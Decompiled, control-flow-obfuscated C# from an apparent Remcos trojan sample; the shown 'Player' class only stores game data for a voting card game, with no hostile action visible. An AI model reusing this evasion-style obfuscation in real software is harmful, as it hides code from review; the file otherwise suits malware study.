// Decompiled with JetBrains decompiler
// Type: Vändtia_Live_Server.Player
// Assembly: W1rxzw3ZKeRvpGn, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 142397A1-15D1-D7EF-251C-AE295CB71E89
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan.MSIL.Remcos.gen-869da055040f18615ffee1bc2369c1e6496fce17b977c375b8501f7f91f0606d.exe

using System;
using Vändtia_Live_Server.My;

namespace Vändtia_Live_Server
{
  public class Player
  {
    private int PlayerNumber;
    private string CardType;
    private string PlayerName;
    private int FontSize;
    private string UniquePlayerID;
    private int VoteCount;
    private bool HunterSights;

    public Player(int num, string type, string name)
    {
label_6:
      int num1 = 15;
      int num2 = -6;
      while (true)
      {
        switch ((num2 ^ 61) + 60)
        {
          case 0:
            switch (num1)
            {
              case 56:
                this.UniquePlayerID = "";
                num1 = 12;
                goto label_1;
              case 57:
                this.VoteCount = 0;
                num1 = 8;
                goto label_1;
              case 58:
                this.FontSize = 10;
                num1 = 13;
                goto label_1;
              case 59:
                this.PlayerName = name;
                num1 = 117;
                goto label_1;
              case 60:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Player.AddVote);
                num1 = 9;
                goto label_1;
              case 61:
                this.HunterSights = false;
                num1 = 11;
                goto label_1;
              case 62:
                this.PlayerNumber = num;
                num1 = 10;
                goto label_1;
              case 63:
                this.CardType = type;
                num1 = 14;
                goto label_1;
              case 64:
                goto label_16;
              default:
                num2 = -8;
                continue;
            }
          case 1:
            goto label_6;
          case 2:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Player.\u002Ector);
            num2 = -5;
            continue;
          case 3:
label_1:
            num1 ^= 53;
            break;
        }
        num2 = FoodItem.\uE607\uE6C8\uF041\uE1D1\uEB67\uF562\uF59C\uEDEA\uEABB\uE409\uF42B\uF64E(13);
      }
label_16:;
    }

    public Player()
    {
label_7:
      int num1 = FoodItem.\uE607\uE6C8\uF041\uE1D1\uEB67\uF562\uF59C\uEDEA\uEABB\uE409\uF42B\uF64E(34);
      int num2 = 122;
      while (true)
      {
        switch (num2 ^ 58)
        {
          case 61:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Player.get_GetHunterSights);
            num2 = 7;
            continue;
          case 62:
            switch (num1 + 61)
            {
              case 0:
                this.HunterSights = false;
                num1 = -15;
                goto label_1;
              case 1:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Player.get_GetCardType);
                num1 = -3;
                goto label_1;
              case 2:
                this.FontSize = 10;
                num1 = FormLoader.\uF6D9\uF827\uF028\uED0F\uECCA\uE547\uF4C8\uF468\uEA41\uE615\uE78E\uE0F5(31);
                goto label_1;
              case 3:
                this.UniquePlayerID = "";
                num1 = -2;
                goto label_1;
              case 4:
                this.VoteCount = 0;
                num1 = -6;
                goto label_1;
              case 5:
                goto label_13;
              default:
                num2 = 5;
                continue;
            }
          case 63:
            goto label_7;
          case 64:
label_1:
            num1 ^= 57;
            break;
        }
        num2 = 4;
      }
label_13:;
    }

    public string GetUniquePlayerID
    {
      get
      {
label_5:
        int num1 = 3;
        int num2 = 122;
        string uniquePlayerId;
        while (true)
        {
          switch (num2 ^ 56)
          {
            case 63:
              RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Player.get_GetVoteCount);
              num2 = 7;
              continue;
            case 64:
              goto label_5;
            case 65:
              switch (num1)
              {
                case 56:
                  uniquePlayerId = this.UniquePlayerID;
                  num1 = 1;
                  goto label_1;
                case 57:
                  RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Player.\u002Ector);
                  num1 = 2;
                  goto label_1;
                case 58:
                case 59:
                  goto label_10;
                default:
                  num2 = 120;
                  continue;
              }
            case 66:
label_1:
              num1 ^= 59;
              break;
          }
          num2 = 121;
        }
label_10:
        return uniquePlayerId;
      }
    }

    public void SetUniquePlayerID(string id) => this.UniquePlayerID = id;

    public int GetPlayerNumber
    {
      get
      {
label_5:
        int num1 = 4;
        int num2 = -6;
        int playerNumber;
        while (true)
        {
          switch ((num2 ^ 63) + 62)
          {
            case 0:
              RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Player.SetFontSize);
              num2 = -3;
              continue;
            case 1:
              goto label_5;
            case 2:
              switch (num1)
              {
                case 57:
                  RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Player.get_GetPlayerNumber);
                  num1 = 7;
                  goto label_1;
                case 58:
                  playerNumber = this.PlayerNumber;
                  num1 = 5;
                  goto label_1;
                case 59:
                case 60:
                  goto label_10;
                default:
                  num2 = -4;
                  continue;
              }
            case 3:
label_1:
              num1 ^= 62;
              break;
          }
          num2 = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA90.\uE152\uE14D\uE4B1\uE4CF\uEFA5\uEAA8\uF7D2\uF85C\uF37D\uF074\uF5CA\uE496(14);
        }
label_10:
        return playerNumber;
      }
    }

    public string GetCardType
    {
      get
      {
label_5:
        int num1 = 3;
        int num2 = 7;
        string cardType;
        while (true)
        {
          switch (num2 ^ 60)
          {
            case 56:
              RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Player.get_GetPlayerNumber);
              num2 = 4;
              continue;
            case 57:
              goto label_5;
            case 58:
              switch (num1)
              {
                case 57:
                  cardType = this.CardType;
                  num1 = 1;
                  goto label_1;
                case 58:
                  RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Player.\u002Ector);
                  num1 = 0;
                  goto label_1;
                case 59:
                case 60:
                  goto label_10;
                default:
                  num2 = 5;
                  continue;
              }
            case 59:
label_1:
              num1 ^= 58;
              break;
          }
          num2 = 6;
        }
label_10:
        return cardType;
      }
    }

    public string GetPlayerName
    {
      get
      {
label_7:
        int num1 = FormLoader.\uF6D9\uF827\uF028\uED0F\uECCA\uE547\uF4C8\uF468\uEA41\uE615\uE78E\uE0F5(35);
        int num2 = 119;
        string playerName;
        while (true)
        {
          switch (num2 ^ 55)
          {
            case 61:
              RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Player.SetPlayerCardType);
              num2 = 10;
              continue;
            case 62:
              switch (num1 + 58)
              {
                case 0:
                  playerName = this.PlayerName;
                  num1 = Mazes.\uED64\uF7C9\uE463\uE570\uEDE5\uF0EF\uEC88\uF1DB\uF4DB\uE913\uF508\uF2F8(62);
                  goto label_1;
                case 1:
                case 3:
                  goto label_10;
                case 2:
                  RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Player.SetVoteCount);
                  num1 = -3;
                  goto label_1;
                default:
                  num2 = 8;
                  continue;
              }
            case 63:
              goto label_7;
            case 64:
label_1:
              num1 ^= 53;
              break;
          }
          num2 = 9;
        }
label_10:
        return playerName;
      }
    }

    public void SetPlayerName(string name) => this.PlayerName = name;

    public int GetFontSize
    {
      get
      {
label_7:
        int num1 = 15;
        int num2 = 124;
        int fontSize;
        while (true)
        {
          switch (num2 ^ 62)
          {
            case 63:
              RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Player.get_GetUniquePlayerID);
              num2 = 1;
              continue;
            case 64:
              switch (num1)
              {
                case 54:
                  fontSize = this.FontSize;
                  num1 = 14;
                  goto label_1;
                case 55:
                case 57:
                  goto label_10;
                case 56:
                  RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Player.get_GetHunterSights);
                  num1 = 1;
                  goto label_1;
                default:
                  num2 = (int) sbyte.MaxValue;
                  continue;
              }
            case 65:
              goto label_7;
            case 66:
label_1:
              num1 ^= 57;
              break;
          }
          num2 = 126;
        }
label_10:
        return fontSize;
      }
    }

    public void SetFontSize(int size) => this.FontSize = size;

    public void SetPlayerNumber(int num) => this.PlayerNumber = num;

    public void SetPlayerCardType(string type) => this.CardType = type;

    public void AddVote() => ++this.VoteCount;

    public void SetVoteCount(int vote) => (this.VoteCount) += (vote);

    public object GetVoteCount
    {
      get
      {
label_6:
        int num1 = Mazes.\uED64\uF7C9\uE463\uE570\uEDE5\uF0EF\uEC88\uF1DB\uF4DB\uE913\uF508\uF2F8(53);
        int num2 = Mazes.\uED64\uF7C9\uE463\uE570\uEDE5\uF0EF\uEC88\uF1DB\uF4DB\uE913\uF508\uF2F8(53);
        object voteCount;
        while (true)
        {
          switch ((num2 ^ 62) + 58)
          {
            case 0:
              switch (num1 + 53)
              {
                case 0:
                  voteCount = (object) this.VoteCount;
                  num1 = FormLoader.\uF6D9\uF827\uF028\uED0F\uECCA\uE547\uF4C8\uF468\uEA41\uE615\uE78E\uE0F5(36);
                  goto label_1;
                case 1:
                case 3:
                  goto label_10;
                case 2:
                  RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Player.get_GetPlayerName);
                  num1 = -15;
                  goto label_1;
                default:
                  num2 = -7;
                  continue;
              }
            case 1:
              goto label_6;
            case 2:
              RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Player.get_GetPlayerNumber);
              num2 = -10;
              continue;
            case 3:
label_1:
              num1 ^= 60;
              break;
          }
          num2 = FoodItem.\uE607\uE6C8\uF041\uE1D1\uEB67\uF562\uF59C\uEDEA\uEABB\uE409\uF42B\uF64E(16);
        }
label_10:
        return voteCount;
      }
    }

    public void SetHunterSights(bool @bool) => this.HunterSights = @bool;

    public object GetHunterSights
    {
      get
      {
label_4:
        int num1 = 15;
        int num2 = 5;
        object hunterSights;
        while (true)
        {
          switch (num2 ^ 63)
          {
            case 55:
              goto label_4;
            case 56:
              RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Player.SetFontSize);
              num2 = 7;
              continue;
            case 57:
              switch (num1)
              {
                case 58:
                  hunterSights = (object) this.HunterSights;
                  num1 = 9;
                  goto label_1;
                case 59:
                  RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Player.AddVote);
                  num1 = 14;
                  goto label_1;
                case 60:
                case 61:
                  goto label_10;
                default:
                  num2 = 8;
                  continue;
              }
            case 58:
label_1:
              num1 ^= 53;
              break;
          }
          num2 = 6;
        }
label_10:
        return hunterSights;
      }
    }
  }
}
